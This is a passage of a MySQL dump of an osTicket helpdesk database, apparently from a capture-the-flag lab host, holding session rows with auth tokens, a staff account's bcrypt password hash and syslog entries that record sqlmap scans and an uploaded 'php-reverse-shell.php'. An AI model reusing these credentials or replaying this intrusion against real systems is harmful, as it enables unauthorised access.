Required\";}}_auth|a:1:{s:5:\"staff\";a:3:{s:2:\"id\";i:1;s:3:\"key\";s:19:\"local:maildeliverer\";s:3:\"2fa\";N;}}:token|a:1:{s:5:\"staff\";s:76:\"bb98fede337598e8fd68ae36d7eca246:1609000222:76131d2089f4125f89547767159bb5d3\";}::Q:T|i:1;sort|a:1:{i:1;a:2:{s:9:\"queuesort\";O:9:\"QueueSort\":7:{s:8:\"_columns\";a:2:{s:15:\"cdata__priority\";b:1;s:10:\"lastupdate\";b:1;}s:6:\"_extra\";N;s:2:\"ht\";a:5:{s:2:\"id\";i:1;s:4:\"root\";N;s:4:\"name\";s:32:\"Priority + Most Recently Updated\";s:7:\"columns\";s:34:\"[\"-cdata__priority\",\"-lastupdate\"]\";s:7:\"updated\";s:19:\"2020-12-26 09:14:00\";}s:5:\"dirty\";a:0:{}s:7:\"__new__\";b:0;s:11:\"__deleted__\";b:0;s:12:\"__deferred__\";a:0:{}}s:3:\"dir\";i:0;}}cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}qcounts|a:1:{s:48:\"counts.queues.1.nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3\";a:2:{s:6:\"counts\";a:14:{s:2:\"q1\";d:1;s:2:\"q2\";d:1;s:2:\"q6\";d:0;s:2:\"q9\";d:0;s:2:\"q3\";d:0;s:2:\"q7\";d:0;s:3:\"q10\";d:0;s:2:\"q4\";d:0;s:2:\"q5\";d:0;s:3:\"q11\";d:0;s:2:\"q8\";d:0;s:3:\"q12\";d:0;s:3:\"q13\";d:0;s:3:\"q14\";d:0;}s:4:\"time\";i:1609000223;}}lastcroncall|i:1608999862;','2020-12-27 11:30:23',NULL,'1','172.16.10.141','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'),('ehf4cmkv8fkgj7dt6aod19247b','csrf|a:2:{s:5:\"token\";s:40:\"61fbaf86626e00dab429680706dceae039451a0e\";s:4:\"time\";i:1608993145;}_staff|a:1:{s:4:\"auth\";a:2:{s:4:\"dest\";s:14:\"/scp/admin.php\";s:3:\"msg\";s:23:\"Authentication Required\";}}_auth|a:1:{s:5:\"staff\";a:3:{s:2:\"id\";i:1;s:3:\"key\";s:19:\"local:maildeliverer\";s:3:\"2fa\";N;}}:token|a:1:{s:5:\"staff\";s:76:\"4fe37977155262be67d710463b206a47:1608993143:76131d2089f4125f89547767159bb5d3\";}cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}qcounts|a:1:{s:48:\"counts.queues.1.nP8uygzdkzXRLJzYUmdmLDEqDSq5bGk3\";a:2:{s:6:\"counts\";a:14:{s:2:\"q1\";d:1;s:2:\"q2\";d:1;s:2:\"q6\";d:0;s:2:\"q9\";d:0;s:2:\"q3\";d:0;s:2:\"q7\";d:0;s:3:\"q10\";d:0;s:2:\"q4\";d:0;s:2:\"q5\";d:0;s:3:\"q11\";d:0;s:2:\"q8\";d:0;s:3:\"q12\";d:0;s:3:\"q13\";d:0;s:3:\"q14\";d:0;}s:4:\"time\";i:1608993065;}}lastcroncall|i:1608993065;','2020-12-27 09:32:25',NULL,'1','172.16.10.141','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'),('g10e1q9n9nt6bbs2nrtoqrs1ml','csrf|a:2:{s:5:\"token\";s:40:\"6ac290b738c0502ade36040189583039b54d79d0\";s:4:\"time\";i:1609844807;}captcha|s:32:\"9bb1ac4cbd2cc877bf5d6a9c2f5fcd62\";cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}_auth|a:2:{s:4:\"user\";a:2:{s:2:\"id\";i:6;s:3:\"key\";s:10:\"authlink:6\";}s:11:\"user-ticket\";s:7:\"7466068\";}:token|a:1:{s:6:\"client\";s:76:\"d95216f72b2fd1608b53f7d4a6cd498f:1609844807:3f4c7a2a129c29be1c242fddd5f95cab\";}','2021-01-06 06:06:47',NULL,'0','10.10.14.2','python-requests/2.24.0'),('ide2vqaqh68o7po8o2v82de86c','csrf|a:2:{s:5:\"token\";s:40:\"1719a2b7f0992621f64ecf752fd9faa6877031b1\";s:4:\"time\";i:1612045066;}captcha|s:32:\"a7445383e6448fa57ad72a602f7570d4\";cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}_auth|a:2:{s:4:\"user\";a:2:{s:2:\"id\";i:10;s:3:\"key\";s:11:\"authlink:10\";}s:11:\"user-ticket\";s:7:\"6216848\";}:token|a:1:{s:6:\"client\";s:76:\"17c027f75b46125086b2e841b4ec68fb:1612045059:68346f82662243b40ca1d3ae38f6267d\";}','2021-01-31 17:17:46',NULL,'0','10.10.14.50','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'),('lc1gbc897qtluv49mtujk3d7d4','csrf|a:2:{s:5:\"token\";s:40:\"26756f2b9343176854e1ecfc515ab67db1a3ce1d\";s:4:\"time\";i:1612044309;}','2021-01-31 17:05:09',NULL,'0','10.10.14.157','sqlmap/1.4.8.11#dev (http://sqlmap.org)'),('n32hja5mlj45h12mffd7m4g7ka','csrf|a:2:{s:5:\"token\";s:40:\"4870dc009b367f9e2a684163cea9da21b90338b4\";s:4:\"time\";i:1609835184;}captcha|s:32:\"70c3446a690bb1c8b83a09a33cf0b0d1\";cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}','2021-01-06 03:26:24',NULL,'0','10.10.14.2','Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0'),('r5e23guqqmkfvpvq80nnjg59e0','csrf|a:2:{s:5:\"token\";s:40:\"6e0ecdaaa0087efe284eabb117d1dc54e77bddf0\";s:4:\"time\";i:1612045115;}captcha|s:32:\"46f2c9f3c9aa605bb656cac9a7d5a59d\";_client|a:1:{s:4:\"auth\";a:1:{s:4:\"dest\";s:116:\"/file.php?key=qufsit_bsdebsgkxiha2z54t5xqj43vi&expires=1612051200&signature=98bfb42181e2c0242a316da6ca121b4ed37b1e4b\";}}_auth|a:2:{s:4:\"user\";a:2:{s:2:\"id\";i:9;s:3:\"key\";s:10:\"authlink:9\";}s:11:\"user-ticket\";s:7:\"4109302\";}cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}:token|a:1:{s:6:\"client\";s:76:\"576126f675b3de534284aac3411f4120:1612045093:ec3e752e023c5946a5f791b41c5cbc78\";}','2021-01-31 17:18:35',NULL,'0','10.10.14.157','Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'),('rcivbat4tqumrf2s8c70b1dlpc','csrf|a:2:{s:5:\"token\";s:40:\"a14c88656a4824d32da74d3a18fd5e6c86a38013\";s:4:\"time\";i:1612043275;}captcha|s:32:\"14bcbb516f504f436b879a0752e8296a\";cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}_auth|a:2:{s:4:\"user\";a:0:{}s:11:\"user-ticket\";s:7:\"2883226\";}:token|a:0:{}','2021-01-31 16:47:55',NULL,'0','10.10.14.157','Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0'),('rq1028ioqb54khp1kofhvngpr9','csrf|a:2:{s:5:\"token\";s:40:\"4ee92291931abb38db4eda73d84af69c9daadb00\";s:4:\"time\";i:1612042425;}','2021-01-31 16:33:45',NULL,'0','10.10.16.6','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36'),('t3ltgvql8vgjiqdebg9do1d417','csrf|a:2:{s:5:\"token\";s:40:\"2369ffa0157d2e9a3fa32f30f5c014ece853172e\";s:4:\"time\";i:1609844806;}captcha|s:32:\"83593afb7d526773c72e30dd406c2e67\";cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}_auth|a:2:{s:4:\"user\";a:2:{s:2:\"id\";i:5;s:3:\"key\";s:10:\"authlink:5\";}s:11:\"user-ticket\";s:7:\"9122359\";}:token|a:1:{s:6:\"client\";s:76:\"80f732d62fd9edaa2f9972ad87a51836:1609844806:3f4c7a2a129c29be1c242fddd5f95cab\";}','2021-01-06 06:06:46',NULL,'0','10.10.14.2','python-requests/2.24.0'),('tm5leufsfsmlkdramhbekc5bcc','csrf|a:2:{s:5:\"token\";s:40:\"8db04c5f98575d277b0914f86cb41c8d7a49a6bf\";s:4:\"time\";i:1609844790;}captcha|s:32:\"68067dcd4afd1d1b57308ba6da049fb5\";cfg:core|a:1:{s:11:\"db_timezone\";s:16:\"America/New_York\";}_auth|a:2:{s:4:\"user\";a:2:{s:2:\"id\";i:3;s:3:\"key\";s:10:\"authlink:3\";}s:11:\"user-ticket\";s:7:\"5056505\";}:token|a:1:{s:6:\"client\";s:76:\"b40ce88fb29186f4fef9fc4265f9478b:1609844789:3f4c7a2a129c29be1c242fddd5f95cab\";}','2021-01-06 06:06:30',NULL,'0','10.10.14.2','python-requests/2.24.0');
/*!40000 ALTER TABLE `ost_session` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_sla`
--

DROP TABLE IF EXISTS `ost_sla`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_sla` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `schedule_id` int(10) unsigned NOT NULL DEFAULT 0,
  `flags` int(10) unsigned NOT NULL DEFAULT 3,
  `grace_period` int(10) unsigned NOT NULL DEFAULT 0,
  `name` varchar(64) NOT NULL DEFAULT '',
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_sla`
--

LOCK TABLES `ost_sla` WRITE;
/*!40000 ALTER TABLE `ost_sla` DISABLE KEYS */;
INSERT INTO `ost_sla` VALUES (1,0,3,18,'Default SLA',NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_sla` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_staff`
--

DROP TABLE IF EXISTS `ost_staff`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_staff` (
  `staff_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `dept_id` int(10) unsigned NOT NULL DEFAULT 0,
  `role_id` int(10) unsigned NOT NULL DEFAULT 0,
  `username` varchar(32) NOT NULL DEFAULT '',
  `firstname` varchar(32) DEFAULT NULL,
  `lastname` varchar(32) DEFAULT NULL,
  `passwd` varchar(128) DEFAULT NULL,
  `backend` varchar(32) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `phone` varchar(24) NOT NULL DEFAULT '',
  `phone_ext` varchar(6) DEFAULT NULL,
  `mobile` varchar(24) NOT NULL DEFAULT '',
  `signature` text NOT NULL,
  `lang` varchar(16) DEFAULT NULL,
  `timezone` varchar(64) DEFAULT NULL,
  `locale` varchar(16) DEFAULT NULL,
  `notes` text DEFAULT NULL,
  `isactive` tinyint(1) NOT NULL DEFAULT 1,
  `isadmin` tinyint(1) NOT NULL DEFAULT 0,
  `isvisible` tinyint(1) unsigned NOT NULL DEFAULT 1,
  `onvacation` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `assigned_only` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `show_assigned_tickets` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `change_passwd` tinyint(1) unsigned NOT NULL DEFAULT 0,
  `max_page_size` int(11) unsigned NOT NULL DEFAULT 0,
  `auto_refresh_rate` int(10) unsigned NOT NULL DEFAULT 0,
  `default_signature_type` enum('none','mine','dept') NOT NULL DEFAULT 'none',
  `default_paper_size` enum('Letter','Legal','Ledger','A4','A3') NOT NULL DEFAULT 'Letter',
  `extra` text DEFAULT NULL,
  `permissions` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `lastlogin` datetime DEFAULT NULL,
  `passwdreset` datetime DEFAULT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`staff_id`),
  UNIQUE KEY `username` (`username`),
  KEY `dept_id` (`dept_id`),
  KEY `issuperuser` (`isadmin`),
  KEY `isactive` (`isactive`),
  KEY `onvacation` (`onvacation`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_staff`
--

LOCK TABLES `ost_staff` WRITE;
/*!40000 ALTER TABLE `ost_staff` DISABLE KEYS */;
INSERT INTO `ost_staff` VALUES (1,1,1,'maildeliverer','Delivery','Person','$2a$08$VlccTgoFaxEaGJnZtWwJBOf2EqMW5L1ZLA72QoQN/TrrOJt9mFGcy',NULL,'maildeliverer@delivery.htb','',NULL,'','',NULL,NULL,NULL,NULL,1,1,1,0,0,0,0,25,0,'none','Letter','{\"browser_lang\":\"en_US\"}','{\"user.create\":1,\"user.delete\":1,\"user.edit\":1,\"user.manage\":1,\"user.dir\":1,\"org.create\":1,\"org.delete\":1,\"org.edit\":1,\"faq.manage\":1,\"visibility.agents\":1,\"emails.banlist\":1,\"visibility.departments\":1}','2020-12-26 09:14:00','2020-12-26 11:24:22','2020-12-26 09:14:00','2020-12-26 11:24:22');
/*!40000 ALTER TABLE `ost_staff` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_staff_dept_access`
--

DROP TABLE IF EXISTS `ost_staff_dept_access`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_staff_dept_access` (
  `staff_id` int(10) unsigned NOT NULL DEFAULT 0,
  `dept_id` int(10) unsigned NOT NULL DEFAULT 0,
  `role_id` int(10) unsigned NOT NULL DEFAULT 0,
  `flags` int(10) unsigned NOT NULL DEFAULT 1,
  PRIMARY KEY (`staff_id`,`dept_id`),
  KEY `dept_id` (`dept_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_staff_dept_access`
--

LOCK TABLES `ost_staff_dept_access` WRITE;
/*!40000 ALTER TABLE `ost_staff_dept_access` DISABLE KEYS */;
INSERT INTO `ost_staff_dept_access` VALUES (1,3,1,1);
/*!40000 ALTER TABLE `ost_staff_dept_access` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_syslog`
--

DROP TABLE IF EXISTS `ost_syslog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_syslog` (
  `log_id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `log_type` enum('Debug','Warning','Error') NOT NULL,
  `title` varchar(255) NOT NULL,
  `log` text NOT NULL,
  `logger` varchar(64) NOT NULL,
  `ip_address` varchar(64) NOT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`log_id`),
  KEY `log_type` (`log_type`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_syslog`
--

LOCK TABLES `ost_syslog` WRITE;
/*!40000 ALTER TABLE `ost_syslog` DISABLE KEYS */;
INSERT INTO `ost_syslog` VALUES (1,'Debug','osTicket installed!','Congratulations osTicket basic installation completed!\n\nThank you for choosing osTicket!','','172.16.10.141','2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,'Error','Mailer Error','Unable to email via php mail function:\"saint\" mail() returned failure ','','10.10.16.6','2021-01-30 16:33:45','2021-01-30 16:33:45'),(3,'Warning','Failed login attempt (user)','Username: hack@hack.com IP: 10.10.14.157 Time: Jan 30, 2021, 9:54 pm UTC Attempts: 3','','10.10.14.157','2021-01-30 16:54:15','2021-01-30 16:54:15'),(4,'Error','Mailer Error','Unable to email via php mail function:maildeliverer@delivery.htb mail() returned failure ','','10.10.14.157','2021-01-30 16:54:55','2021-01-30 16:54:55'),(5,'Error','DB Error #1062','[INSERT INTO `ost_attachment` SET `file_id` = 3, `type` = \'D\', `object_id` = 8, `name` = \'php-reverse-shell.php\'] Duplicate entry \'3-8\' for key \'file_object\'<br /><br /> ---- Backtrace ----<br /> #0 (root)/include/mysqli.php(201): osTicket-&gt;logDBError(\'DB Error #1062\', \'[INSERT INTO `o...\')<br /> #1 (root)/include/class.orm.php(3466): db_query(\'INSERT INTO `os...\', true, true)<br /> #2 (root)/include/class.orm.php(658): MySqlExecutor-&gt;execute()<br /> #3 (root)/include/class.attachment.php(180): VerySimpleModel-&gt;save()<br /> #4 (root)/include/ajax.draft.php(100): GenericAttachments-&gt;upload(Array)<br /> #5 (root)/include/ajax.draft.php(232): DraftAjaxAPI-&gt;_uploadInlineImage(Object(Draft))<br /> #6 (root)/include/ajax.draft.php(247): DraftAjaxAPI-&gt;uploadInlineImageClient(8)<br /> #7 (root)/include/class.dispatcher.php(145): DraftAjaxAPI-&gt;uploadInlineImageEarlyClient(\'ticket.client.v...\')<br /> #8 (root)/include/class.dispatcher.php(38): UrlMatcher-&gt;dispatch(\'ticket.client.v...\', Array)<br /> #9 (root)/include/class.dispatcher.php(120): Dispatcher-&gt;resolve(\'ticket.client.v...\', Array)<br /> #10 (root)/include/class.dispatcher.php(38): UrlMatcher-&gt;dispatch(\'/draft/ticket.c...\', NULL)<br /> #11 (root)/ajax.php(51): Dispatcher-&gt;resolve(\'/draft/ticket.c...\')<br /> #12 {main}','','10.10.14.157','2021-01-30 16:54:55','2021-01-30 16:54:55'),(6,'Error','Mailer Error','Unable to email via php mail function:maildeliverer@delivery.htb mail() returned failure ','','10.10.14.157','2021-01-30 16:57:01','2021-01-30 16:57:01'),(7,'Error','DB Error #1062','[INSERT INTO `ost_attachment` SET `type` = \'H\', `object_id` = 10, `file_id` = 3, `inline` = 1] Duplicate entry \'3-10\' for key \'file_object\'<br /><br /> ---- Backtrace ----<br /> #0 (root)/include/mysqli.php(201): osTicket-&gt;logDBError(\'DB Error #1062\', \'[INSERT INTO `o...\')<br /> #1 (root)/include/class.orm.php(3466): db_query(\'INSERT INTO `os...\', true, true)<br /> #2 (root)/include/class.orm.php(658): MySqlExecutor-&gt;execute()<br /> #3 (root)/include/class.thread.php(1253): VerySimpleModel-&gt;save()<br /> #4 (root)/include/class.thread.php(1261): ThreadEntry-&gt;createAttachment(Array, false)<br /> #5 (root)/include/class.thread.php(1800): ThreadEntry-&gt;createAttachments(Array)<br /> #6 (root)/include/class.thread.php(1812): ThreadEntry::create(Array)<br /> #7 (root)/include/class.thread.php(2944): ThreadEntry::add(Array)<br /> #8 (root)/include/class.thread.php(3159): MessageThreadEntry::add(Array, Array)<br /> #9 (root)/include/class.ticket.php(3122): ObjectThread-&gt;addMessage(Array, Array)<br /> #10 (root)/tickets.php(94): Ticket-&gt;postMessage(Array, \'Web\')<br /> #11 {main}','','10.10.14.157','2021-01-30 16:57:01','2021-01-30 16:57:01'),(8,'Warning','Invalid CSRF Token __CSRFToken__','Invalid CSRF token [ae97725f21d7228e2e5d526c42832590fb3252df] on http://helpdesk.delivery.htb/tickets.php?id=18','','10.10.14.50','2021-01-30 17:02:32','2021-01-30 17:02:32'),(9,'Error','Mailer Error','Unable to email via php mail function:\"hacking\" mail() returned failure ','','10.10.14.157','2021-01-30 17:02:40','2021-01-30 17:02:40');
/*!40000 ALTER TABLE `ost_syslog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_task`
--

DROP TABLE IF EXISTS `ost_task`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_task` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `object_id` int(11) NOT NULL DEFAULT 0,
  `object_type` char(1) NOT NULL,
  `number` varchar(20) DEFAULT NULL,
  `dept_id` int(10) unsigned NOT NULL DEFAULT 0,
  `staff_id` int(10) unsigned NOT NULL DEFAULT 0,
  `team_id` int(10) unsigned NOT NULL DEFAULT 0,
  `lock_id` int(11) unsigned NOT NULL DEFAULT 0,
  `flags` int(10) unsigned NOT NULL DEFAULT 0,
  `duedate` datetime DEFAULT NULL,
  `closed` datetime DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `dept_id` (`dept_id`),
  KEY `staff_id` (`staff_id`),
  KEY `team_id` (`team_id`),
  KEY `created` (`created`),
  KEY `object` (`object_id`,`object_type`),
  KEY `flags` (`flags`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_task`
--

LOCK TABLES `ost_task` WRITE;
/*!40000 ALTER TABLE `ost_task` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_task` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_task__cdata`
--

DROP TABLE IF EXISTS `ost_task__cdata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_task__cdata` (
  `task_id` int(11) unsigned NOT NULL,
  `title` mediumtext DEFAULT NULL,
  PRIMARY KEY (`task_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_task__cdata`
--

LOCK TABLES `ost_task__cdata` WRITE;
/*!40000 ALTER TABLE `ost_task__cdata` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_task__cdata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_team`
--

DROP TABLE IF EXISTS `ost_team`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_team` (
  `team_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `lead_id` int(10) unsigned NOT NULL DEFAULT 0,
  `flags` int(10) unsigned NOT NULL DEFAULT 1,
  `name` varchar(125) NOT NULL DEFAULT '',
  `notes` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`team_id`),
  UNIQUE KEY `name` (`name`),
  KEY `lead_id` (`lead_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_team`
--

LOCK TABLES `ost_team` WRITE;
/*!40000 ALTER TABLE `ost_team` DISABLE KEYS */;
INSERT INTO `ost_team` VALUES (1,0,1,'Level I Support','Tier 1 support, responsible for the initial iteraction with customers','2020-12-26 09:14:00','2020-12-26 09:14:00');
/*!40000 ALTER TABLE `ost_team` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_team_member`
--

DROP TABLE IF EXISTS `ost_team_member`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_team_member` (
  `team_id` int(10) unsigned NOT NULL DEFAULT 0,
  `staff_id` int(10) unsigned NOT NULL,
  `flags` int(10) unsigned NOT NULL DEFAULT 0,
  PRIMARY KEY (`team_id`,`staff_id`),
  KEY `staff_id` (`staff_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_team_member`
--

LOCK TABLES `ost_team_member` WRITE;
/*!40000 ALTER TABLE `ost_team_member` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_team_member` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_thread`
--

DROP TABLE IF EXISTS `ost_thread`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_thread` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `object_id` int(11) unsigned NOT NULL,
  `object_type` char(1) NOT NULL,
  `extra` text DEFAULT NULL,
  `lastresponse` datetime DEFAULT NULL,
  `lastmessage` datetime DEFAULT NULL,
  `created` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `object_id` (`object_id`),
  KEY `object_type` (`object_type`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_thread`
--

LOCK TABLES `ost_thread` WRITE;
/*!40000 ALTER TABLE `ost_thread` DISABLE KEYS */;
INSERT INTO `ost_thread` VALUES (1,1,'T',NULL,NULL,'2020-12-26 09:14:00','2020-12-26 09:14:00'),(2,2,'T',NULL,NULL,'2021-01-05 03:26:24','2021-01-05 03:26:24'),(3,3,'T',NULL,NULL,'2021-01-05 06:06:28','2021-01-05 06:06:28'),(4,4,'T',NULL,NULL,'2021-01-05 06:06:39','2021-01-05 06:06:39'),(5,5,'T',NULL,NULL,'2021-01-05 06:06:45','2021-01-05 06:06:45'),(6,6,'T',NULL,NULL,'2021-01-05 06:06:46','2021-01-05 06:06:46'),(7,7,'T',NULL,NULL,'2021-01-30 16:40:20','2021-01-30 16:40:20'),(8,8,'T',NULL,NULL,'2021-01-30 16:52:41','2021-01-30 16:52:41'),(9,9,'T',NULL,NULL,'2021-01-30 16:57:01','2021-01-30 16:55:43'),(10,10,'T',NULL,NULL,'2021-01-30 17:17:46','2021-01-30 17:03:59'),(11,11,'T',NULL,NULL,'2021-01-30 17:09:01','2021-01-30 17:09:01');
/*!40000 ALTER TABLE `ost_thread` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_thread_collaborator`
--

DROP TABLE IF EXISTS `ost_thread_collaborator`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_thread_collaborator` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `flags` int(10) unsigned NOT NULL DEFAULT 1,
  `thread_id` int(11) unsigned NOT NULL DEFAULT 0,
  `user_id` int(11) unsigned NOT NULL DEFAULT 0,
  `role` char(1) NOT NULL DEFAULT 'M',
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `collab` (`thread_id`,`user_id`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_thread_collaborator`
--

LOCK TABLES `ost_thread_collaborator` WRITE;
/*!40000 ALTER TABLE `ost_thread_collaborator` DISABLE KEYS */;
/*!40000 ALTER TABLE `ost_thread_collaborator` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ost_thread_entry`
--

DROP TABLE IF EXISTS `ost_thread_entry`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ost_thread_entry` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `pid` int(11) unsigned NOT NULL DEFAULT 0,
  `thread_id` int(11) unsigned NOT NULL DEFAULT 0,
  `staff_id` int(11) unsigned NOT NULL DEFAULT 0,
  `user_id` int(11) unsigned NOT NULL DEFAULT 0,
  `type` char(1) NOT NULL DEFAULT '',
  `flags` int(11) unsigned NOT NULL DEFAULT 0,
  `poster` varchar(128) NOT NULL DEFAULT '',
  `editor` int(10) unsigned DEFAULT NULL,
  `editor_type` char(1) DEFAULT NULL,
  `source` varchar(32) NOT NULL DEFAULT '',
  `title` varchar(255) DEFAULT NULL,
  `body` text NOT NULL,
  `format` varchar(16) NOT NULL DEFAULT 'html',
  `ip_address` varchar(64) NOT NULL DEFAULT '',
  `extra` text DEFAULT NULL,
  `recipients` text DEFAULT NULL,
  `created` datetime NOT NULL,
  `updated` datetime NOT NULL,
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`),
  KEY `thread_id` (`thread_id`),
  KEY `staff_id` (`staff_id`),
  KEY `type` (`type`)
) ENGINE=InnoDB AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ost_thread_entry`
--

LOCK TABLES `ost_thread_entry` WRITE;
/*!40000 ALTER TABLE `ost_thread_entry` DISABLE KEYS */;
INSERT INTO `ost_thread_entry` VALUES (1,0,1,0,1,'M',65,'osTicket Support',NULL,NULL,'Web','osTicket Installed!',' <p>Thank you for choosing osTicket. </p> <p>Please make sure you join the <a href=\"https://forum.osticket.com\">osTicket forums</a> and our <a href=\"https://osticket.com\">mailing list</a> to stay up to date on the latest news, security alerts and updates. The osTicket forums are also a great place to get assistance, guidance, tips, and help from other osTicket users. In addition to the forums, the osTicket wiki provides a useful collection of educational materials, documentation, and notes from the community. We welcome your contributions to the osTicket community. </p> <p>If you are looking for a greater level of support, we provide professional services and commercial support with guaranteed response times, and access to the core development team. We can also help customize osTicket or even add new features to the system to meet your unique needs. </p> <p>If the idea of managing and upgrading this osTicket installation is daunting, you can try osTicket as a hosted service at <a href=\"https://supportsystem.com\">https://supportsystem.com/</a> -- no installation required and we can import your data! With SupportSystem\'s turnkey infrastructure, you get osTicket at its best, leaving you free to focus on your customers without the burden of making sure the application is stable, maintained, and secure. </p> <p>Cheers, </p> <p>-<br /> osTicket Team https://osticket.com/ 